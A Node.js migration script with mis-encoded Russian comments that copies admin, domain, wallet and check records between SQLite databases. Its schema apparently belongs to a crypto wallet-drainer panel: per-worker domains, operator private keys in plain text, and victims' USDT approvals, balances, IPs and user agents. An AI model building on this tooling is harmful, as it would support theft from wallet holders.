#!/usr/bin/env node

/**
 * –ù–µ–∑–∞–≤–∏—Å–∏–º—ã–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø–µ—Ä–µ–Ω–æ—Å–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Å—Ç–∞—Ä–æ–π SQLite –±–∞–∑—ã (database.sqlite)
 * –≤ –Ω–æ–≤—É—é SQLite –±–∞–∑—É (database.db) —Å –Ω–æ–≤–æ–π —Å—Ö–µ–º–æ–π Prisma
 * 
 * –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:
 * 1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏: npm install sqlite3
 * 2. –ü–æ–º–µ—Å—Ç–∏—Ç–µ —Ñ–∞–π–ª—ã database.sqlite –∏ database.db –≤ —Ç—É –∂–µ –ø–∞–ø–∫—É —á—Ç–æ –∏ —Å–∫—Ä–∏–ø—Ç
 * 3. –ó–∞–ø—É—Å—Ç–∏—Ç–µ: node migrate-data.js
 */

const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const path = require('path');

// –ü—É—Ç–∏ –∫ –±–∞–∑–∞–º –¥–∞–Ω–Ω—ã—Ö
const OLD_DB_PATH = './database.sqlite';
const NEW_DB_PATH = './database.db';

class DataMigrator {
    constructor() {
        this.oldDb = null;
        this.newDb = null;
        this.stats = {
            admin: { processed: 0, success: 0, errors: 0 },
            domain: { processed: 0, success: 0, errors: 0 },
            wallet: { processed: 0, success: 0, errors: 0 },
            check: { processed: 0, success: 0, errors: 0 }
        };
    }

    async connect() {
        console.log('üîó –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–∞–º –¥–∞–Ω–Ω—ã—Ö...');
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤
        if (!fs.existsSync(OLD_DB_PATH)) {
            throw new Error(`–°—Ç–∞—Ä–∞—è –±–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: ${OLD_DB_PATH}`);
        }
        
        if (!fs.existsSync(NEW_DB_PATH)) {
            throw new Error(`–ù–æ–≤–∞—è –±–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: ${NEW_DB_PATH}`);
        }

        return new Promise((resolve, reject) => {
            this.oldDb = new sqlite3.Database(OLD_DB_PATH, sqlite3.OPEN_READONLY, (err) => {
                if (err) {
                    reject(new Error(`–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —Å—Ç–∞—Ä–æ–π –ë–î: ${err.message}`));
                    return;
                }
                console.log('‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ —Å—Ç–∞—Ä–æ–π –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö');
                
                this.newDb = new sqlite3.Database(NEW_DB_PATH, sqlite3.OPEN_READWRITE, (err) => {
                    if (err) {
                        reject(new Error(`–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –Ω–æ–≤–æ–π –ë–î: ${err.message}`));
                        return;
                    }
                    console.log('‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ –Ω–æ–≤–æ–π –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö');
                    resolve();
                });
            });
        });
    }

    async disconnect() {
        console.log('üîå –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –∫ –±–∞–∑–∞–º –¥–∞–Ω–Ω—ã—Ö...');
        
        if (this.oldDb) {
            await new Promise((resolve) => {
                this.oldDb.close((err) => {
                    if (err) console.error('–û—à–∏–±–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è —Å—Ç–∞—Ä–æ–π –ë–î:', err.message);
                    resolve();
                });
            });
        }
        
        if (this.newDb) {
            await new Promise((resolve) => {
                this.newDb.close((err) => {
                    if (err) console.error('–û—à–∏–±–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è –Ω–æ–≤–æ–π –ë–î:', err.message);
                    resolve();
                });
            });
        }
    }

    async queryOldDb(sql, params = []) {
        return new Promise((resolve, reject) => {
            this.oldDb.all(sql, params, (err, rows) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(rows);
                }
            });
        });
    }

    async runNewDb(sql, params = []) {
        return new Promise((resolve, reject) => {
            this.newDb.run(sql, params, function(err) {
                if (err) {
                    reject(err);
                } else {
                    resolve({ id: this.lastID, changes: this.changes });
                }
            });
        });
    }

    async migrateAdmins() {
        console.log('\nüë§ –ú–∏–≥—Ä–∞—Ü–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤...');
        
        try {
            const admins = await this.queryOldDb('SELECT * FROM admins');
            console.log(`üìä –ù–∞–π–¥–µ–Ω–æ ${admins.length} –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ –≤ —Å—Ç–∞—Ä–æ–π –ë–î`);
            
            for (const admin of admins) {
                this.stats.admin.processed++;
                
                try {
                    await this.runNewDb(`
                        INSERT OR REPLACE INTO Admin (id, username, password, created_at, last_login, updated_at)
                        VALUES (?, ?, ?, ?, ?, ?)
                    `, [
                        admin.id,
                        admin.username,
                        admin.password,
                        admin.created_at || new Date().toISOString(),
                        admin.last_login,
                        admin.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.admin.success++;
                    console.log(`‚úÖ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä ${admin.username} –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω`);
                } catch (error) {
                    this.stats.admin.errors++;
                    console.error(`‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–æ—Å–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ ${admin.username}:`, error.message);
                }
            }
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ –∏–∑ —Å—Ç–∞—Ä–æ–π –ë–î:', error.message);
        }
    }

    async migrateDomains() {
        console.log('\nüåê –ú–∏–≥—Ä–∞—Ü–∏—è –¥–æ–º–µ–Ω–æ–≤...');
        
        try {
            const domains = await this.queryOldDb('SELECT * FROM domains');
            console.log(`üìä –ù–∞–π–¥–µ–Ω–æ ${domains.length} –¥–æ–º–µ–Ω–æ–≤ –≤ —Å—Ç–∞—Ä–æ–π –ë–î`);
            
            for (const domain of domains) {
                this.stats.domain.processed++;
                
                try {
                    // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º JSON –ø–æ–ª—è
                    let chats = '[]';
                    let metadata = '{}';
                    let append_transaction_data = '{}';
                    
                    try {
                        if (domain.chats) {
                            if (typeof domain.chats === 'string') {
                                chats = domain.chats;
                            } else {
                                chats = JSON.stringify(domain.chats);
                            }
                        }
                    } catch (e) {
                        console.warn(`‚ö†Ô∏è  –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ chats –¥–ª—è –¥–æ–º–µ–Ω–∞ ${domain.domain}:`, e.message);
                    }
                    
                    try {
                        if (domain.metadata) {
                            if (typeof domain.metadata === 'string') {
                                metadata = domain.metadata;
                            } else {
                                metadata = JSON.stringify(domain.metadata);
                            }
                        }
                    } catch (e) {
                        console.warn(`‚ö†Ô∏è  –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ metadata –¥–ª—è –¥–æ–º–µ–Ω–∞ ${domain.domain}:`, e.message);
                    }
                    
                    try {
                        if (domain.append_transaction_data) {
                            if (typeof domain.append_transaction_data === 'string') {
                                append_transaction_data = domain.append_transaction_data;
                            } else {
                                append_transaction_data = JSON.stringify(domain.append_transaction_data);
                            }
                        }
                    } catch (e) {
                        console.warn(`‚ö†Ô∏è  –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ append_transaction_data –¥–ª—è –¥–æ–º–µ–Ω–∞ ${domain.domain}:`, e.message);
                    }

                    await this.runNewDb(`
                        INSERT OR REPLACE INTO Domain (
                            id, worker_id, worker_nickname, domain, chats, metadata,
                            low_balance_every_10_min, low_balance_text, append_transaction_data,
                            operator_wallet_address, operator_wallet_privateKey, only_contract,
                            minimal_asset_amount, created_at, updated_at
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    `, [
                        domain.id,
                        domain.worker_id || '',
                        domain.worker_nickname || '',
                        domain.domain || '',
                        chats,
                        metadata,
                        domain.low_balance_every_10_min,
                        domain.low_balance_text,
                        append_transaction_data,
                        domain.operator_wallet_address,
                        domain.operator_wallet_privateKey,
                        domain.only_contract ? 1 : 0,
                        domain.minimal_asset_amount || 10,
                        domain.created_at || new Date().toISOString(),
                        domain.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.domain.success++;
                    console.log(`‚úÖ –î–æ–º–µ–Ω ${domain.domain} –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω`);
                } catch (error) {
                    this.stats.domain.errors++;
                    console.error(`‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–æ—Å–∞ –¥–æ–º–µ–Ω–∞ ${domain.domain}:`, error.message);
                }
            }
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ–º–µ–Ω–æ–≤ –∏–∑ —Å—Ç–∞—Ä–æ–π –ë–î:', error.message);
        }
    }

    async migrateWallets() {
        console.log('\nüí≥ –ú–∏–≥—Ä–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–æ–≤...');
        
        try {
            const wallets = await this.queryOldDb('SELECT * FROM wallets');
            console.log(`üìä –ù–∞–π–¥–µ–Ω–æ ${wallets.length} –∫–æ—à–µ–ª—å–∫–æ–≤ –≤ —Å—Ç–∞—Ä–æ–π –ë–î`);
            
            for (const wallet of wallets) {
                this.stats.wallet.processed++;
                
                try {
                    await this.runNewDb(`
                        INSERT OR REPLACE INTO Wallet (
                            id, address, walletType, sessionId, session, userAgent, ipAddress, hostname, country,
                            metadata, has_usdt_approval, usdt_approval_txid, usdt_approval_date,
                            trxBalance, usdtBalance, lastBalanceUpdate, created_at, updated_at
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    `, [
                        wallet.id,
                        wallet.address || '',
                        wallet.walletType || wallet.wallet_type || '',
                        wallet.sessionId || wallet.session_id || '',
                        wallet.session || null,
                        wallet.userAgent || wallet.user_agent || '',
                        wallet.ipAddress || wallet.ip_address || '',
                        wallet.hostname || '',
                        wallet.country || '',
                        wallet.metadata || '',
                        wallet.has_usdt_approval ? 1 : 0,
                        wallet.usdt_approval_txid || '',
                        wallet.usdt_approval_date,
                        parseFloat(wallet.trxBalance || wallet.trx_balance || 0),
                        parseFloat(wallet.usdtBalance || wallet.usdt_balance || 0),
                        wallet.lastBalanceUpdate || wallet.last_balance_update,
                        wallet.created_at || new Date().toISOString(),
                        wallet.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.wallet.success++;
                    console.log(`‚úÖ –ö–æ—à–µ–ª–µ–∫ ${wallet.address} –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω`);
                } catch (error) {
                    this.stats.wallet.errors++;
                    console.error(`‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–æ—Å–∞ –∫–æ—à–µ–ª—å–∫–∞ ${wallet.address}:`, error.message);
                }
            }
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–æ–≤ –∏–∑ —Å—Ç–∞—Ä–æ–π –ë–î:', error.message);
        }
    }

    async migrateChecks() {
        console.log('\nüßæ –ú–∏–≥—Ä–∞—Ü–∏—è —á–µ–∫–æ–≤...');
        
        try {
            const checks = await this.queryOldDb('SELECT * FROM checks');
            console.log(`üìä –ù–∞–π–¥–µ–Ω–æ ${checks.length} —á–µ–∫–æ–≤ –≤ —Å—Ç–∞—Ä–æ–π –ë–î`);
            
            for (const check of checks) {
                this.stats.check.processed++;
                
                try {
                    await this.runNewDb(`
                        INSERT OR REPLACE INTO "Check" (
                            id, wallet_address, amount, check_data, raw_check, timer_start, timer_end,
                            status, hostname, ip_address, user_agent, created_at, updated_at
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    `, [
                        check.id,
                        check.wallet_address || '',
                        parseFloat(check.amount || 0),
                        check.check_data,
                        check.raw_check,
                        check.timer_start || new Date().toISOString(),
                        check.timer_end || new Date().toISOString(),
                        check.status || 'active',
                        check.hostname,
                        check.ip_address,
                        check.user_agent,
                        check.created_at || new Date().toISOString(),
                        check.updated_at || new Date().toISOString()
                    ]);
                    
                    this.stats.check.success++;
                    console.log(`‚úÖ –ß–µ–∫ –¥–ª—è ${check.wallet_address} (${check.amount}) –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω`);
                } catch (error) {
                    this.stats.check.errors++;
                    console.error(`‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–æ—Å–∞ —á–µ–∫–∞ ${check.id}:`, error.message);
                }
            }
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —á–µ–∫–æ–≤ –∏–∑ —Å—Ç–∞—Ä–æ–π –ë–î:', error.message);
        }
    }

    printStats() {
        console.log('\nüìà –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ú–ò–ì–†–ê–¶–ò–ò:');
        console.log('=' * 50);
        
        Object.entries(this.stats).forEach(([table, stats]) => {
            console.log(`\n${table.toUpperCase()}:`);
            console.log(`  üìù –û–±—Ä–∞–±–æ—Ç–∞–Ω–æ: ${stats.processed}`);
            console.log(`  ‚úÖ –£—Å–ø–µ—à–Ω–æ: ${stats.success}`);
            console.log(`  ‚ùå –û—à–∏–±–æ–∫: ${stats.errors}`);
            
            if (stats.processed > 0) {
                const successRate = ((stats.success / stats.processed) * 100).toFixed(1);
                console.log(`  üìä –£—Å–ø–µ—à–Ω–æ—Å—Ç—å: ${successRate}%`);
            }
        });
        
        const totalProcessed = Object.values(this.stats).reduce((sum, s) => sum + s.processed, 0);
        const totalSuccess = Object.values(this.stats).reduce((sum, s) => sum + s.success, 0);
        const totalErrors = Object.values(this.stats).reduce((sum, s) => sum + s.errors, 0);
        
        console.log('\nüìä –û–ë–©–ê–Ø –°–¢–ê–¢–ò–°–¢–ò–ö–ê:');
        console.log(`  üìù –í—Å–µ–≥–æ –∑–∞–ø–∏—Å–µ–π: ${totalProcessed}`);
        console.log(`  ‚úÖ –ü–µ—Ä–µ–Ω–µ—Å–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ: ${totalSuccess}`);
        console.log(`  ‚ùå –û—à–∏–±–æ–∫: ${totalErrors}`);
        
        if (totalProcessed > 0) {
            const overallSuccessRate = ((totalSuccess / totalProcessed) * 100).toFixed(1);
            console.log(`  üìä –û–±—â–∞—è —É—Å–ø–µ—à–Ω–æ—Å—Ç—å: ${overallSuccessRate}%`);
        }
    }

    async migrate() {
        try {
            console.log('üöÄ –ù–∞—á–∞–ª–æ –º–∏–≥—Ä–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Å—Ç–∞—Ä–æ–π SQLite –±–∞–∑—ã –≤ –Ω–æ–≤—É—é...\n');
            
            await this.connect();
            
            // –í—ã–ø–æ–ª–Ω—è–µ–º –º–∏–≥—Ä–∞—Ü–∏—é —Ç–∞–±–ª–∏—Ü –ø–æ –ø–æ—Ä—è–¥–∫—É
            await this.migrateAdmins();
            await this.migrateDomains();
            await this.migrateWallets();
            await this.migrateChecks();
            
            this.printStats();
            
            console.log('\nüéâ –ú–∏–≥—Ä–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞!');
            
        } catch (error) {
            console.error('\nüí• –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –º–∏–≥—Ä–∞—Ü–∏–∏:', error.message);
            throw error;
        } finally {
            await this.disconnect();
        }
    }
}

// –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
function parseArgs() {
    const args = process.argv.slice(2);
    const options = {
        help: false,
        force: false
    };
    
    for (const arg of args) {
        switch (arg) {
            case '--help':
            case '-h':
                options.help = true;
                break;
            case '--force':
            case '-f':
                options.force = true;
                break;
        }
    }
    
    return options;
}

function printHelp() {
    console.log(`
üìö –°–ö–†–ò–ü–¢ –ú–ò–ì–†–ê–¶–ò–ò –î–ê–ù–ù–´–•

–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: node migrate-data.js [–æ–ø—Ü–∏–∏]

–û–ø—Ü–∏–∏:
  -h, --help     –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç—É —Å–ø—Ä–∞–≤–∫—É
  -f, --force    –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤ –Ω–æ–≤–æ–π –ë–î

–û–ø–∏—Å–∞–Ω–∏–µ:
  –°–∫—Ä–∏–ø—Ç –ø–µ—Ä–µ–Ω–æ—Å–∏—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å—Ç–∞—Ä–æ–π SQLite –±–∞–∑—ã (database.sqlite)
  –≤ –Ω–æ–≤—É—é SQLite –±–∞–∑—É (database.db) —Å –Ω–æ–≤–æ–π —Å—Ö–µ–º–æ–π Prisma.

–¢—Ä–µ–±–æ–≤–∞–Ω–∏—è:
  1. –§–∞–π–ª database.sqlite –¥–æ–ª–∂–µ–Ω —Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å –≤ —Ç–æ–π –∂–µ –ø–∞–ø–∫–µ
  2. –§–∞–π–ª database.db –¥–æ–ª–∂–µ–Ω —Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å –∏ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å—Ö–µ–º—É Prisma
  3. –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–∞—è –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å: npm install sqlite3

–¢–∞–±–ª–∏—Ü—ã –¥–ª—è –º–∏–≥—Ä–∞—Ü–∏–∏:
  - admins ‚Üí Admin
  - domains ‚Üí Domain  
  - wallets ‚Üí Wallet
  - checks ‚Üí Check
`);
}

// –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
async function main() {
    const options = parseArgs();
    
    if (options.help) {
        printHelp();
        return;
    }
    
    console.log('üîÑ –ú–ò–ì–†–ê–¶–ò–Ø –î–ê–ù–ù–´–• –ò–ó –°–¢–ê–†–û–ô SQLITE –ë–ê–ó–´ –í –ù–û–í–£–Æ');
    console.log('================================================\n');
    
    if (!options.force) {
        console.log('‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –î–∞–Ω–Ω—ã–µ –≤ –Ω–æ–≤–æ–π –±–∞–∑–µ –º–æ–≥—É—Ç –±—ã—Ç—å –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω—ã!');
        console.log('üí° –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ --force –¥–ª—è –ø—Ä–æ–ø—É—Å–∫–∞ —ç—Ç–æ–≥–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è\n');
        
        // –í —Ä–µ–∞–ª—å–Ω–æ–º —Å–∫—Ä–∏–ø—Ç–µ –∑–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
        // –î–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ –ø—Ä–æ–ø—É—Å–∫–∞–µ–º
    }
    
    const migrator = new DataMigrator();
    
    try {
        await migrator.migrate();
        process.exit(0);
    } catch (error) {
        console.error('\nüí• –ú–∏–≥—Ä–∞—Ü–∏—è –Ω–µ —É–¥–∞–ª–∞—Å—å:', error.message);
        process.exit(1);
    }
}

// –ó–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞
if (require.main === module) {
    main().catch(error => {
        console.error('–ù–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞:', error);
        process.exit(1);
    });
}

module.exports = { DataMigrator };
